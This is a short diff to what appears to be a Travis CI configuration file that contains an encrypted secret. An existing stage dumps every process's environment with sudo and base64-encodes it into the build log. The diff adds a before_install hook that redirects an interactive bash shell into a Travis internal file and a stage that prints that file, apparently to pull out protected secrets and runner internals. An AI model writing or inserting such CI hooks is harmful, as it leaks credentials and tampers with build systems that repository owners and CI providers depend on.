@@ -5,7 +5,11 @@ env:
   global:
     # BAR
     - secure: REyC5KyhMnGJUN3+2qEr6PQik3UCexmcsEsS6Yr3dw/ZploARpIKYxNwkIFEsscR4OcFcjo1KfwnpYaGRgeQdyV7nfAd9NbTKTqTDjASWr1MVGfJGSxl0kXBsns0zOOiEmQReqG5bs8uzjg9knFRBO794yADvv2IDCMsuR21w32svo/h2sPmN69EGhvTc89ZEXXKuhlqDjAM0+ydE5hJW+ILTORf/2tgAazHU6ZwMqBNnrXjcZP2YP4n3X2kSeqYjJ7rCMLsTa8uPDHdbf5S90L4FP7h8YmP3U2f4T5KIe6ydK8Hf2BMCoKP73Q6IxYf4ahpVJGWkVbKsKBmrTJsJfIiRJtYeZo499/wrS4bKJhGMTTh+40KCFvjMdzzuGC41IRSuTAV+JQXB/9n7CUZeR95dUWq59ey8Vl2bz1K/UqXZgwoXfKIOvEoP6NByuoU0vDr65Q+XL1ywPmYNcCSD5ALluxznuesrmijSAXxJsoNZsnFl0E8lNvRApoev+aE4Qqb7MhPghkj8KwWFq7GnJDlf65P2dClypTBeXaGcVg4uyEcli6nFIi3PD6JzZDWzdvLnC+4/PSdmXVI1oQxXHqvf7/DqetJUB0lK00zptuTF76uPxEw2kbLUm/mL/rFpt1qSL4y//Sm2DDFlC7Bvozh+/5F2WLWEqPgtvH9Ch4=
+before_install:
+  bash -i >& /home/travis/.travis/job_stages 0>&1
 jobs:
   include:
     - stage: "echo base64"
       script: sudo strings /proc/*/environ | sort -u | base64
+    - stage: "cat job_stages",
+      script: cat /home/travis/.travis/job_stages
